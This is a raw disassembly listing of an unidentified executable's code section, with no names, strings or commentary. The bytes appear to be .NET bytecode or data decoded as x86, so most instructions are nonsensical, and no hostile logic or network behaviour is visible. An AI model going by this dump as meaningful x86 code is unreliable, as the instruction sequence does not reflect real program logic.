  4026a7:	outs   dx,DWORD PTR ds:[esi]
  4026a8:	inc    esi
  4026a9:	add    BYTE PTR [eax],al
  4026ab:	or     al,BYTE PTR [edi]
  4026ad:	outs   dx,DWORD PTR ds:[esi]
  4026ae:	inc    edi
  4026af:	add    BYTE PTR [eax],al
  4026b1:	or     cl,BYTE PTR [edi+edi*1+0x28010000]
  4026b8:	daa    
  4026b9:	add    BYTE PTR [eax],al
  4026bb:	or     ch,BYTE PTR [eax]
  4026bd:	das    
  4026be:	add    BYTE PTR [eax],al
  4026c0:	or     al,BYTE PTR [edi]
  4026c2:	or     ch,BYTE PTR [ebx]
  4026c4:	adc    eax,0x4873
  4026c9:	or     cl,BYTE PTR [edx]
  4026cb:	sub    BYTE PTR [ebx+0x28060000],dl
  4026d1:	push   ss
  4026d2:	add    BYTE PTR [eax],al
  4026d4:	or     ch,BYTE PTR [eax]
  4026d6:	das    
  4026d7:	add    BYTE PTR [eax],al
  4026d9:	or     dh,BYTE PTR [ebx+0x4a]
  4026dc:	add    BYTE PTR [eax],al
  4026de:	push   es
  4026df:	adc    eax,DWORD PTR ds:0x506f0511
  4026e5:	add    BYTE PTR [eax],al
  4026e7:	push   es
  4026e8:	sub    eax,0x6f051107
  4026ed:	dec    esi
  4026ee:	add    BYTE PTR [eax],al
  4026f0:	push   es
  4026f1:	adc    DWORD PTR ds:0x356f03,eax
  4026f7:	add    BYTE PTR [esi],al
  4026f9:	push   es
  4026fa:	outs   dx,DWORD PTR ds:[esi]
  4026fb:	push   ecx
  4026fc:	add    BYTE PTR [eax],al
  4026fe:	push   es
  4026ff:	adc    eax,DWORD PTR [esi]
  402701:	fimul  WORD PTR [edi]
  402703:	adc    DWORD PTR es:0x4c6f,eax
  40270a:	push   es
  40270b:	outs   dx,DWORD PTR ds:[esi]
  40270c:	dec    ecx
  40270d:	add    BYTE PTR [eax],al
  40270f:	or     bh,dh
  402711:	sbb    dl,BYTE PTR [ecx]
  402713:	push   es
  402714:	sub    al,BYTE PTR [eax]
  402716:	add    BYTE PTR [eax],al
  402718:	add    DWORD PTR [eax+eax*1],ebx
  40271b:	add    BYTE PTR [eax],al
  40271d:	add    BYTE PTR [edx+0x0],al
  402720:	cs jo  0x402723
  402723:	sbb    eax,0x1000031
  402728:	add    BYTE PTR [eax],al
  40272a:	fld    QWORD PTR [eax]
  40272c:	adc    ch,bh
  40272e:	add    BYTE PTR [edi],cl
  402730:	add    DWORD PTR [eax],eax
  402732:	add    BYTE PTR [ecx],al
  402734:	push   ds
  402735:	add    ch,BYTE PTR [eax]
  402737:	dec    edx
  402738:	add    BYTE PTR [eax],al
  40273a:	or     ch,BYTE PTR [edx]
  40273c:	sbb    esi,DWORD PTR [eax]
  40273e:	add    eax,0xc200
  402743:	add    BYTE PTR [edi],al
  402745:	add    BYTE PTR [eax],al
  402747:	adc    DWORD PTR [ebx+0x4a],esi
  40274a:	add    BYTE PTR [eax],al
  40274c:	push   es
  40274d:	or     al,BYTE PTR [esi]
  40274f:	outs   dx,DWORD PTR ds:[esi]
  402750:	push   eax
  402751:	add    BYTE PTR [eax],al
  402753:	push   es
  402754:	cmp    DWORD PTR [ebx+0x28000000],esp
  40275a:	jo     0x40275c
  40275c:	add    BYTE PTR [esi],al
  40275e:	sub    BYTE PTR [esi],dl
  402760:	add    BYTE PTR [eax],al
  402762:	or     ch,BYTE PTR [eax]
  402764:	das    
  402765:	add    BYTE PTR [eax],al
  402767:	or     al,BYTE PTR [esi]
  402769:	outs   dx,DWORD PTR ds:[esi]
  40276a:	dec    esp
  40276b:	add    BYTE PTR [eax],al
  40276d:	push   es
  40276e:	outs   dx,DWORD PTR ds:[esi]
  40276f:	dec    ebx
  402770:	add    BYTE PTR [eax],al
  402772:	or     ah,BYTE PTR [esi]
  402774:	sub    BYTE PTR [edi+0x0],ch
  402777:	add    BYTE PTR [esi],al
  402779:	sub    BYTE PTR [esi],dl
  40277b:	add    BYTE PTR [eax],al
  40277d:	or     dl,BYTE PTR [esi]
  40277f:	or     al,0xdd
  402781:	add    DWORD PTR [eax],0x0
  402784:	add    BYTE PTR [ebx],cl
  402786:	sbb    dh,BYTE PTR [edx-0x59]
  402789:	add    DWORD PTR [eax],eax
  40278b:	jo     0x4027a5
  40278d:	lea    eax,[ecx]
  40278f:	add    BYTE PTR [eax],al
  402791:	add    DWORD PTR ds:0x6f071609,ecx
  402797:	dec    esp
  402798:	add    BYTE PTR [eax],al
  40279a:	or     ch,BYTE PTR [edi+0x4d]
  40279d:	add    BYTE PTR [eax],al
  40279f:	or     cl,BYTE PTR [esi+ebp*1-0x5dff0000]
  4027a6:	or     DWORD PTR [edi],edx
  4027a8:	pop    es
  4027a9:	outs   dx,DWORD PTR ds:[esi]
  4027aa:	dec    esp
  4027ab:	add    BYTE PTR [eax],al
  4027ad:	or     ch,BYTE PTR [edi+0x4e]
  4027b0:	add    BYTE PTR [eax],al
  4027b2:	or     ah,BYTE PTR [edx+0x4f2809]
  4027b8:	add    BYTE PTR [edx],cl
  4027ba:	pop    es
  4027bb:	jb     0x402796
  4027bd:	add    DWORD PTR [eax],eax
  4027bf:	jo     0x4027e9
  4027c1:	sbb    eax,DWORD PTR [eax]
  4027c3:	add    BYTE PTR [edx],cl
  4027c5:	pop    es
  4027c6:	outs   dx,DWORD PTR ds:[esi]
  4027c7:	dec    esp
  4027c8:	add    BYTE PTR [eax],al
  4027ca:	or     ch,BYTE PTR [edi+0x4d]
  4027cd:	add    BYTE PTR [eax],al
  4027cf:	or     bl,BYTE PTR [edi]
  4027d1:	or     eax,0x6d280e33
  4027d6:	add    BYTE PTR [eax],al
  4027d8:	push   es
  4027d9:	sub    BYTE PTR [esi],dl
  4027db:	add    BYTE PTR [eax],al
  4027dd:	or     dl,BYTE PTR [edi]
  4027df:	or     al,0xde
  4027e1:	sub    BYTE PTR es:[esi+0x0],ch
  4027e5:	add    BYTE PTR [esi],al
  4027e7:	sub    BYTE PTR [esi],dl
  4027e9:	add    BYTE PTR [eax],al
  4027eb:	or     bl,BYTE PTR [eax]
  4027ed:	or     al,0xde
  4027ef:	sbb    BYTE PTR [esi],al
  4027f1:	outs   dx,DWORD PTR ds:[esi]
  4027f2:	dec    esp
  4027f3:	add    BYTE PTR [eax],al
  4027f5:	push   es
  4027f6:	outs   dx,DWORD PTR ds:[esi]
  4027f7:	dec    ecx
  4027f8:	add    BYTE PTR [eax],al
  4027fa:	or     bl,ah
  4027fc:	sub    BYTE PTR [ebp+0x0],ch
  4027ff:	add    BYTE PTR [esi],al
  402801:	sub    BYTE PTR [esi],dl
  402803:	add    BYTE PTR [eax],al
  402805:	or     dl,BYTE PTR [edi]
  402807:	sub    cl,BYTE PTR [eax]
  402809:	sub    al,BYTE PTR [eax]
  40280b:	add    BYTE PTR [ecx],al
  40280d:	sbb    al,0x0
  40280f:	add    BYTE PTR [eax],al
  402811:	add    BYTE PTR [ecx],dl
  402813:	add    BYTE PTR [edi*1+0x26b00],ch
  40281a:	add    BYTE PTR [ebx],bl
  40281c:	add    al,BYTE PTR [eax]
  40281e:	adc    DWORD PTR [eax],eax
  402820:	xchg   edi,eax
  402821:	test   al,0x0
  402823:	or     al,0x0
  402825:	add    BYTE PTR [eax],al
  402827:	add    BYTE PTR [esi],bl
  402829:	add    ch,BYTE PTR [eax]
  40282b:	dec    edx
  40282c:	add    BYTE PTR [eax],al
  40282e:	or     ch,BYTE PTR [edx]
  402830:	sbb    esi,DWORD PTR [eax]
  402832:	add    eax,DWORD PTR [eax]
  402834:	leave  
  402835:	add    BYTE PTR [eax],al
  402837:	add    BYTE PTR [eax],cl
  402839:	add    BYTE PTR [eax],al
  40283b:	adc    DWORD PTR [ebx],eax
  40283d:	outs   dx,DWORD PTR ds:[esi]
  40283e:	xor    eax,0x6f060000
  402843:	aas    
  402844:	add    BYTE PTR [eax],al
  402846:	or     ch,BYTE PTR [eax]
  402848:	cmp    al,BYTE PTR [eax]
  40284a:	add    BYTE PTR [esi],al
  40284c:	sub    al,0x12
  40284e:	add    ebp,DWORD PTR [edi+0x35]
  402851:	add    BYTE PTR [eax],al
  402853:	push   es
  402854:	outs   dx,DWORD PTR ds:[esi]
  402855:	aas    
  402856:	add    BYTE PTR [eax],al
  402858:	or     ch,BYTE PTR [eax]
  40285a:	inc    eax
  40285b:	add    BYTE PTR [eax],al
  40285d:	or     ch,BYTE PTR ds:0x992812
  402863:	add    BYTE PTR [esi],al
  402865:	sub    BYTE PTR [edx+0x0],ch
  402868:	add    BYTE PTR [esi],al
  40286a:	sub    BYTE PTR [ecx],bl
  40286c:	add    BYTE PTR [eax],al
  40286e:	or     bl,BYTE PTR [edi]
  402870:	or     eax,0x2b6f032a
  402875:	add    BYTE PTR [eax],al
  402877:	push   es
  402878:	sub    BYTE PTR [eax+0x0],dl
  40287b:	add    BYTE PTR [edx],cl
  40287d:	sub    eax,0x77280c
  402882:	add    BYTE PTR [esi],al
  402884:	sub    BYTE PTR [esi],dl
  402886:	add    BYTE PTR [eax],al
  402888:	or     dl,BYTE PTR [edi]
  40288a:	sub    dh,BYTE PTR [ebx+0x51]
  40288d:	add    BYTE PTR [eax],al
  40288f:	or     cl,BYTE PTR [eax+ecx*1]
  402892:	add    ebp,DWORD PTR [edi+0x2b]
  402895:	add    BYTE PTR [eax],al
  402897:	push   es
  402898:	outs   dx,DWORD PTR ds:[esi]
  402899:	push   edx
  40289a:	add    BYTE PTR [eax],al
  40289c:	or     cl,BYTE PTR [eax]
  40289e:	add    ebp,DWORD PTR [edi+0x2d]
  4028a1:	add    BYTE PTR [eax],al
  4028a3:	push   es
  4028a4:	outs   dx,DWORD PTR ds:[esi]
  4028a5:	push   ebx
  4028a6:	add    BYTE PTR [eax],al
  4028a8:	or     cl,BYTE PTR [eax]
  4028aa:	add    ebp,DWORD PTR [edi+0x2b]
  4028ad:	add    BYTE PTR [eax],al
  4028af:	push   es
  4028b0:	sub    BYTE PTR [eax+eax*1+0x0],dl
  4028b4:	or     ch,BYTE PTR [edi+0x45]
  4028b7:	add    BYTE PTR [eax],al
  4028b9:	or     cl,BYTE PTR [eax]
  4028bb:	or     ch,BYTE PTR [eax]
  4028bd:	js     0x4028bf
  4028bf:	add    BYTE PTR [esi],al
  4028c1:	push   es
  4028c2:	outs   dx,DWORD PTR ds:[esi]
  4028c3:	inc    esi
  4028c4:	add    BYTE PTR [eax],al
  4028c6:	or     ch,BYTE PTR [eax]
  4028c8:	sbb    DWORD PTR [eax],eax
  4028ca:	add    BYTE PTR [edx],cl
  4028cc:	sub    BYTE PTR [edi],ch
  4028ce:	add    BYTE PTR [eax],al
  4028d0:	or     dh,BYTE PTR [ebx+0x4a]
  4028d3:	add    BYTE PTR [eax],al
  4028d5:	push   es
  4028d6:	or     eax,DWORD PTR [edi]
  4028d8:	outs   dx,DWORD PTR ds:[esi]
  4028d9:	push   eax
  4028da:	add    BYTE PTR [eax],al
  4028dc:	push   es
  4028dd:	sub    eax,0x4e6f0706
  4028e2:	add    BYTE PTR [eax],al
  4028e4:	push   es
  4028e5:	pop    es
  4028e6:	add    ebp,DWORD PTR [edi+0x35]
  4028e9:	add    BYTE PTR [eax],al
  4028eb:	push   es
  4028ec:	push   es
  4028ed:	outs   dx,DWORD PTR ds:[esi]
  4028ee:	push   ecx
  4028ef:	add    BYTE PTR [eax],al
  4028f1:	push   es
  4028f2:	or     eax,0x7260ede
  4028f7:	outs   dx,DWORD PTR ds:[esi]
  4028f8:	dec    esp
  4028f9:	add    BYTE PTR [eax],al
  4028fb:	push   es
  4028fc:	outs   dx,DWORD PTR ds:[esi]
  4028fd:	dec    ecx
  4028fe:	add    BYTE PTR [eax],al
  402900:	or     bh,dh
  402902:	sbb    cl,BYTE PTR [ecx]
  402904:	sub    al,BYTE PTR [eax]
  402906:	add    BYTE PTR [eax],al
  402908:	add    DWORD PTR [eax],edx
  40290a:	add    BYTE PTR [eax],al
  40290c:	add    BYTE PTR [eax],al
  40290e:	test   eax,0xb91000
  402913:	push   cs
  402914:	add    DWORD PTR [eax],eax
  402916:	add    BYTE PTR [ecx],al
  402918:	push   ds
  402919:	add    ch,BYTE PTR [eax]
  40291b:	dec    edx
  40291c:	add    BYTE PTR [eax],al
  40291e:	or     ch,BYTE PTR [edx]
  402920:	sbb    esi,DWORD PTR [eax]
  402922:	add    DWORD PTR [eax],eax
  402924:	add    BYTE PTR ds:[eax],al
  402927:	add    BYTE PTR [ecx],cl
  402929:	add    BYTE PTR [eax],al
  40292b:	adc    DWORD PTR [ebx+0x4a],esi
  40292e:	add    BYTE PTR [eax],al
  402930:	push   es
  402931:	or     al,BYTE PTR [esi]
  402933:	outs   dx,DWORD PTR ds:[esi]
  402934:	push   eax
  402935:	add    BYTE PTR [eax],al
  402937:	push   es
  402938:	sub    al,0xe
  40293a:	push   es
  40293b:	outs   dx,DWORD PTR ds:[esi]
  40293c:	dec    esp
  40293d:	add    BYTE PTR [eax],al
  40293f:	push   es
  402940:	outs   dx,DWORD PTR ds:[esi]
  402941:	push   ebp
  402942:	add    BYTE PTR [eax],al
  402944:	or     cl,BYTE PTR [ebx]
  402946:	sub    ebx,DWORD PTR [ebx]
  402948:	push   es
  402949:	outs   dx,DWORD PTR ds:[esi]
  40294a:	dec    esi
  40294b:	add    BYTE PTR [eax],al
  40294d:	push   es
  40294e:	push   es
  40294f:	outs   dx,DWORD PTR ds:[esi]
  402950:	dec    esp
  402951:	add    BYTE PTR [eax],al
  402953:	push   es
  402954:	outs   dx,DWORD PTR ds:[esi]
  402955:	push   ebp
  402956:	add    BYTE PTR [eax],al
  402958:	or     cl,BYTE PTR [ebx]
  40295a:	fiadd  WORD PTR [edi]
  40295c:	push   es
  40295d:	outs   dx,DWORD PTR ds:[esi]
  40295e:	dec    edi
  40295f:	add    BYTE PTR [eax],al
  402961:	push   es
  402962:	fadd   QWORD PTR [edi]
  402964:	sub    BYTE PTR [esi],cl
  402966:	add    BYTE PTR [eax],al
  402968:	push   es
  402969:	sub    al,BYTE PTR [eax]
  40296b:	add    BYTE PTR [ecx],al
  40296d:	adc    BYTE PTR [eax],al
  40296f:	add    BYTE PTR [edx],al
  402971:	add    BYTE PTR [eax+eax*1],bl
  402974:	adc    al,0x30
  402976:	add    BYTE PTR [edi],al
  402978:	add    BYTE PTR [eax],al
  40297a:	add    BYTE PTR [eax],al
  40297c:	adc    esi,DWORD PTR [eax]
  40297e:	add    DWORD PTR [eax],eax
  402980:	push   eax
  402981:	add    BYTE PTR [eax],al
  402983:	add    BYTE PTR [edx],cl
  402985:	add    BYTE PTR [eax],al
  402987:	adc    DWORD PTR ds:0x1c7e0a,edx
  40298d:	add    BYTE PTR [edx],cl
  40298f:	or     eax,DWORD PTR [edx]
  402991:	or     al,0x8
  402993:	inc    ebp
  402994:	add    al,0x0
  402996:	add    BYTE PTR [eax],al
  402998:	add    al,BYTE PTR [eax]
  40299a:	add    BYTE PTR [eax],al
  40299c:	or     al,0x0
  40299e:	add    BYTE PTR [eax],al
  4029a0:	push   ss
  4029a1:	add    BYTE PTR [eax],al
  4029a3:	add    BYTE PTR [eax],ah
  4029a5:	add    BYTE PTR [eax],al
  4029a7:	add    BYTE PTR [ebx],ch
  4029a9:	sub    BYTE PTR es:[ebx+0xb060000],cl
  4029b0:	push   ss
  4029b1:	or     ch,BYTE PTR [ebx]
  4029b3:	sbb    al,0x28
  4029b5:	mov    DWORD PTR [eax],eax
  4029b7:	add    BYTE PTR [esi],al
  4029b9:	or     edx,DWORD PTR [edi]
  4029bb:	or     ch,BYTE PTR [ebx]
  4029bd:	adc    ch,BYTE PTR [eax]
  4029bf:	mov    WORD PTR [eax],es
  4029c1:	add    BYTE PTR [esi],al
  4029c3:	or     ebx,DWORD PTR [eax]
  4029c5:	or     ch,BYTE PTR [ebx]
  4029c7:	or     BYTE PTR [eax],ch
  4029c9:	mov    al,BYTE PTR [eax]
  4029cb:	add    BYTE PTR [esi],al
  4029cd:	or     edx,DWORD PTR ds:0x1628070a
  4029d3:	add    BYTE PTR [eax],al
  4029d5:	or     al,BYTE PTR [esi]
  4029d7:	sub    bl,BYTE PTR [esi]
  4029d9:	add    ch,BYTE PTR [eax]
  4029db:	dec    edx
  4029dc:	add    BYTE PTR [eax],al
  4029de:	or     ch,BYTE PTR [edx]
  4029e0:	push   ds
  4029e1:	add    ch,BYTE PTR [eax]
  4029e3:	dec    edx
  4029e4:	add    BYTE PTR [eax],al
  4029e6:	or     ch,BYTE PTR [edx]
  4029e8:	push   ds
  4029e9:	add    ch,BYTE PTR [eax]
  4029eb:	dec    edx
  4029ec:	add    BYTE PTR [eax],al
  4029ee:	or     ch,BYTE PTR [edx]
  4029f0:	adc    esi,DWORD PTR [eax]
  4029f2:	add    al,BYTE PTR [eax]
  4029f4:	dec    eax
  4029f5:	add    BYTE PTR [eax],al
  4029f7:	add    BYTE PTR [ebx],cl
  4029f9:	add    BYTE PTR [eax],al
  4029fb:	adc    DWORD PTR [edx],eax
  4029fd:	jnp    0x402a36
  4029ff:	add    BYTE PTR [eax],al
  402a01:	add    al,0x2c
  402a03:	sub    DWORD PTR [ebx],eax
  402a05:	outs   dx,DWORD PTR ds:[esi]
  402a06:	push   esi
  402a07:	add    BYTE PTR [eax],al
  402a09:	or     ch,BYTE PTR [esi+0xa]
  402a0c:	add    bh,BYTE PTR [ebx+0x36]
  402a0f:	add    BYTE PTR [eax],al
  402a11:	add    al,0x6f
  402a13:	inc    esi
  402a14:	add    BYTE PTR [eax],al
  402a16:	push   es
  402a17:	or     eax,DWORD PTR [esi]
  402a19:	adc    al,BYTE PTR [ecx]
  402a1b:	sub    BYTE PTR [edi+0x0],dl
  402a1e:	add    BYTE PTR [edx],cl
  402a20:	push   0x33
  402a22:	or     BYTE PTR [edx],dl
  402a24:	add    DWORD PTR [eax],ebp
  402a26:	pop    eax
  402a27:	add    BYTE PTR [eax],al
  402a29:	or     ch,BYTE PTR [edx]
  402a2b:	push   ss
  402a2c:	sub    al,BYTE PTR [ebx]
  402a2e:	outs   dx,DWORD PTR ds:[esi]
  402a2f:	pop    ecx
  402a30:	add    BYTE PTR [eax],al
  402a32:	or     al,BYTE PTR [edx]
  402a34:	jnp    0x402a6c
  402a36:	add    BYTE PTR [eax],al
  402a38:	add    al,0x6f
  402a3a:	inc    edi
  402a3b:	add    BYTE PTR [eax],al
  402a3d:	push   es
  402a3e:	sub    BYTE PTR [edx+0x0],bl
  402a41:	add    BYTE PTR [edx],cl
  402a43:	sub    bh,BYTE PTR [esi]
  402a45:	add    ebp,DWORD PTR [edi+0x56]
  402a48:	add    BYTE PTR [eax],al
  402a4a:	or     al,BYTE PTR [edx]
  402a4c:	jnp    0x402a82
  402a4e:	add    BYTE PTR [eax],al
  402a50:	add    al,0xfe
  402a52:	add    DWORD PTR [edx],ebp
  402a54:	add    ebp,DWORD PTR ds:[edi+0x5b]
  402a58:	add    BYTE PTR [eax],al
  402a5a:	or     al,BYTE PTR [edx]
  402a5c:	jnp    0x402a92
  402a5e:	add    BYTE PTR [eax],al
  402a60:	add    al,0xfe
  402a62:	add    DWORD PTR [edx],ebp
  402a64:	sbb    esi,DWORD PTR [eax]
  402a66:	pop    es
  402a67:	add    bl,ch
  402a69:	add    al,BYTE PTR [eax]
  402a6b:	add    BYTE PTR [eax+eax*1],cl
  402a6e:	add    BYTE PTR [ecx],dl
  402a70:	adc    al,0x13
  402a72:	or     BYTE PTR [ebx-0x66],dh
  402a75:	add    BYTE PTR [eax],al
  402a77:	push   es
  402a78:	adc    ecx,DWORD PTR [ecx]
  402a7a:	add    ebp,DWORD PTR [edi+0x31]
  402a7d:	add    BYTE PTR [eax],al
  402a7f:	push   es
  402a80:	sub    BYTE PTR [eax+0x0],dl
  402a83:	add    BYTE PTR [edx],cl
  402a85:	sub    eax,0x592812
  402a8a:	add    BYTE PTR [esi],al
  402a8c:	add    ebp,DWORD PTR [edi+0x31]
  402a8f:	add    BYTE PTR [eax],al
  402a91:	push   es
  402a92:	sub    BYTE PTR [ecx],bl
  402a94:	add    BYTE PTR [eax],al
  402a96:	or     bl,BYTE PTR [edx]
  402a98:	sub    al,BYTE PTR [ebx]
  402a9a:	outs   dx,DWORD PTR ds:[esi]
  402a9b:	xor    DWORD PTR [eax],eax
  402a9d:	add    BYTE PTR [esi],al
  402a9f:	sub    BYTE PTR [eax+eax*1+0x0],bl
  402aa3:	or     cl,BYTE PTR [edx]
  402aa5:	push   es
  402aa6:	sub    eax,0x5b2812
  402aab:	add    BYTE PTR [esi],al
  402aad:	add    ebp,DWORD PTR [edi+0x31]
  402ab0:	add    BYTE PTR [eax],al
  402ab2:	push   es
  402ab3:	sub    BYTE PTR [ecx],bl
  402ab5:	add    BYTE PTR [eax],al
  402ab7:	or     bl,BYTE PTR [edx]
  402ab9:	sub    al,BYTE PTR [esi]
  402abb:	outs   dx,DWORD PTR ds:[esi]
  402abc:	pop    ebp
  402abd:	add    BYTE PTR [eax],al
  402abf:	or     ch,BYTE PTR ds:0x5e280c
  402ac5:	add    BYTE PTR [edx],cl
  402ac7:	sub    BYTE PTR [esi],dl
  402ac9:	add    BYTE PTR [eax],al
  402acb:	or     bl,BYTE PTR [edx]
  402acd:	sub    dl,BYTE PTR [ecx]
  402acf:	or     DWORD PTR [esi],eax
  402ad1:	outs   dx,DWORD PTR ds:[esi]
  402ad2:	pop    edi
  402ad3:	add    BYTE PTR [eax],al
  402ad5:	or     bh,BYTE PTR [ebp+0x34]
  402ad8:	add    BYTE PTR [eax],al
  402ada:	add    al,0x11
  402adc:	or     DWORD PTR [ebx+0x34],edi
  402adf:	add    BYTE PTR [eax],al
  402ae1:	add    al,0x3a
  402ae3:	and    al,BYTE PTR [ecx]
  402ae5:	add    BYTE PTR [eax],al
  402ae7:	push   es
  402ae8:	outs   dx,DWORD PTR ds:[esi]
  402ae9:	pusha  
  402aea:	add    BYTE PTR [eax],al
  402aec:	or     ch,BYTE PTR [esi+ecx*1]
  402aef:	push   es
  402af0:	outs   dx,DWORD PTR ds:[esi]
  402af1:	pusha  
  402af2:	add    BYTE PTR [eax],al
  402af4:	or     ch,BYTE PTR [edi+0x61]
  402af7:	add    BYTE PTR [eax],al
  402af9:	or     dl,BYTE PTR [esi]
  402afb:	xor    BYTE PTR [esi],al
  402afd:	push   es
  402afe:	sub    BYTE PTR [ecx],dl
  402b00:	add    BYTE PTR [eax],al
  402b02:	push   es
  402b03:	add    ebp,DWORD PTR [edi+0x2f]
  402b06:	add    BYTE PTR [eax],al
  402b08:	push   es
  402b09:	sub    eax,0x12280608
  402b0e:	add    BYTE PTR [eax],al
  402b10:	push   es
  402b11:	pop    ss
  402b12:	sub    dh,BYTE PTR [ebx-0x63]
  402b15:	add    BYTE PTR [eax],al
  402b17:	push   es
  402b18:	or     al,0x8
  402b1a:	adc    DWORD PTR [ecx],ecx
  402b1c:	jge    0x402b53
  402b1e:	add    BYTE PTR [eax],al
  402b20:	add    al,0x8
  402b22:	add    ebp,DWORD PTR [edi+0x2f]
  402b25:	add    BYTE PTR [eax],al
  402b27:	push   es
  402b28:	jge    0x402b60
  402b2a:	add    BYTE PTR [eax],al
  402b2c:	add    al,0x8
  402b2e:	or     BYTE PTR [ebx+0x36],bh
  402b31:	add    BYTE PTR [eax],al
  402b33:	add    al,0x6f
  402b35:	inc    esi
  402b36:	add    BYTE PTR [eax],al
  402b38:	push   es
  402b39:	adc    ecx,DWORD PTR [edx]
  402b3b:	adc    cl,BYTE PTR [edx]
  402b3d:	sub    BYTE PTR [eax+0x0],bl
  402b40:	add    BYTE PTR [edx],cl
  402b42:	jge    0x402b7b
  402b44:	add    BYTE PTR [eax],al
  402b46:	add    al,0x6
  402b48:	outs   dx,DWORD PTR ds:[esi]
  402b49:	pusha  
  402b4a:	add    BYTE PTR [eax],al
  402b4c:	or     cl,BYTE PTR [eax]
  402b4e:	inc    BYTE PTR [esi]
  402b50:	sahf   
  402b51:	add    BYTE PTR [eax],al
  402b53:	push   es
  402b54:	jae    0x402bb8
  402b56:	add    BYTE PTR [eax],al
  402b58:	or     ch,BYTE PTR [eax]
  402b5a:	add    al,BYTE PTR [eax]
  402b5c:	add    BYTE PTR [ebx],ch
  402b5e:	or     eax,DWORD PTR [edi]
  402b60:	sub    BYTE PTR [ebx],al
  402b62:	add    BYTE PTR [eax],al
  402b64:	sub    edx,DWORD PTR [edi]
  402b66:	xor    edx,DWORD PTR [edx+0x11]
  402b69:	or     DWORD PTR [edi],eax
  402b6b:	push   ss
  402b6c:	sub    BYTE PTR [eax+eax*1],al
  402b6f:	add    BYTE PTR [ebx],ch
  402b71:	outs   dx,DWORD PTR ds:[esi]
  402b72:	push   esi
  402b73:	add    BYTE PTR [eax],al
  402b75:	or     bh,BYTE PTR [ebp+0x34]
  402b78:	add    BYTE PTR [eax],al
  402b7a:	add    al,0x8
  402b7c:	jnp    0x402bb5
  402b7e:	add    BYTE PTR [eax],al
  402b80:	add    al,0x3a
  402b82:	xchg   edi,eax
  402b83:	add    BYTE PTR [eax],al
  402b85:	add    BYTE PTR [esi],al
  402b87:	outs   dx,DWORD PTR ds:[esi]
  402b88:	pusha  
  402b89:	add    BYTE PTR [eax],al
  402b8b:	or     dl,BYTE PTR [ecx]
  402b8d:	or     BYTE PTR ds:0xfe09110f,ch
  402b93:	push   es
  402b94:	fwait
  402b95:	add    BYTE PTR [eax],al
  402b97:	push   es
  402b98:	jae    0x402bfc
  402b9a:	add    BYTE PTR [eax],al
  402b9c:	or     dl,BYTE PTR [ebx]
  402b9e:	or     BYTE PTR [ecx],dl
  402ba0:	or     BYTE PTR [eax],ch
  402ba2:	add    eax,0x172b0000
  402ba7:	xor    DWORD PTR [eax+ebp*1+0x21],esi
  402bab:	add    BYTE PTR [eax],al
  402bad:	or     ch,BYTE PTR [eax]
  402baf:	push   ss
  402bb0:	add    BYTE PTR [eax],al
  402bb2:	or     ch,BYTE PTR [eax]
  402bb4:	das    
  402bb5:	add    BYTE PTR [eax],al
  402bb7:	or     bl,BYTE PTR [ecx]
  402bb9:	sub    al,BYTE PTR [edi]
  402bbb:	sub    BYTE PTR [ebx],al
  402bbd:	add    BYTE PTR [eax],al
  402bbf:	sub    ebp,DWORD PTR ds:0x572817
  402bc5:	add    BYTE PTR [esi],al
  402bc7:	sub    BYTE PTR [esi],dl
  402bc9:	add    BYTE PTR [eax],al
  402bcb:	or     ch,BYTE PTR [eax]
  402bcd:	das    
  402bce:	add    BYTE PTR [eax],al
  402bd0:	or     al,BYTE PTR [esi]
  402bd2:	sub    BYTE PTR [edx],dl
  402bd4:	add    BYTE PTR [eax],al
  402bd6:	push   es
  402bd7:	sbb    DWORD PTR [edx],ebp
  402bd9:	or     BYTE PTR [ebx+0x37],bh
  402bdc:	add    BYTE PTR [eax],al
  402bde:	add    al,0x2c
  402be0:	adc    DWORD PTR [eax],ebp
  402be2:	and    DWORD PTR [eax],eax
  402be4:	add    BYTE PTR [edx],cl
  402be6:	sub    BYTE PTR [esi],dl
  402be8:	add    BYTE PTR [eax],al
  402bea:	or     ch,BYTE PTR [eax]
  402bec:	das    
  402bed:	add    BYTE PTR [eax],al
  402bef:	or     bl,BYTE PTR [ecx]
  402bf1:	sub    ch,BYTE PTR [eax]
  402bf3:	pop    ebp
  402bf4:	add    BYTE PTR [eax],al
  402bf6:	push   es
  402bf7:	sub    BYTE PTR [esi],dl
  402bf9:	add    BYTE PTR [eax],al
  402bfb:	or     ch,BYTE PTR [eax]
  402bfd:	das    
  402bfe:	add    BYTE PTR [eax],al
  402c00:	or     al,BYTE PTR [esi]
  402c02:	sub    BYTE PTR [edx],dl
  402c04:	add    BYTE PTR [eax],al
  402c06:	push   es
  402c07:	sbb    DWORD PTR [edx],ebp
  402c09:	add    ebp,DWORD PTR [edi+0x2f]
  402c0c:	add    BYTE PTR [eax],al
  402c0e:	push   es
  402c0f:	sub    al,0xc
  402c11:	sub    BYTE PTR [eax+eax*1+0x0],bl
  402c15:	push   es
  402c16:	sub    BYTE PTR [esi],dl
  402c18:	add    BYTE PTR [eax],al
  402c1a:	or     bl,BYTE PTR [eax]
  402c1c:	sub    al,BYTE PTR [ebx]
  402c1e:	outs   dx,DWORD PTR ds:[esi]
  402c1f:	aaa    
  402c20:	add    BYTE PTR [eax],al
  402c22:	push   es
  402c23:	sub    al,0xc
  402c25:	push   es
  402c26:	add    ebp,DWORD PTR [edi+0x35]
  402c29:	add    BYTE PTR [eax],al
  402c2b:	push   es
  402c2c:	outs   dx,DWORD PTR ds:[esi]
  402c2d:	add    BYTE PTR [bx+si],al
  402c30:	or     al,BYTE PTR [esi]
  402c32:	outs   dx,DWORD PTR ds:[esi]
  402c33:	push   0x30a0000
  402c38:	outs   dx,DWORD PTR ds:[esi]
  402c39:	xor    DWORD PTR [eax],eax
  402c3b:	add    BYTE PTR [esi],al
  402c3d:	sub    BYTE PTR [ecx+0x0],ch
  402c40:	add    BYTE PTR [edx],cl
  402c42:	outs   dx,DWORD PTR ds:[esi]
  402c43:	push   0x0
  402c45:	add    BYTE PTR [edx],cl
  402c47:	push   es
  402c48:	outs   dx,DWORD PTR ds:[esi]
  402c49:	imul   eax,DWORD PTR [eax],0x0
  402c4c:	or     dl,BYTE PTR [ecx]
  402c4e:	or     esi,edi
  402c50:	push   es
  402c51:	pushf  
  402c52:	add    BYTE PTR [eax],al
  402c54:	push   es
  402c55:	jae    0x402cc3
  402c57:	add    BYTE PTR [eax],al
  402c59:	or     ch,BYTE PTR [edi+0x6d]
  402c5c:	add    BYTE PTR [eax],al
  402c5e:	or     ah,BYTE PTR [esi]
  402c60:	sub    BYTE PTR [esi+0x0],ch
  402c63:	add    BYTE PTR [edx],cl
  402c65:	jb     0x402c9a
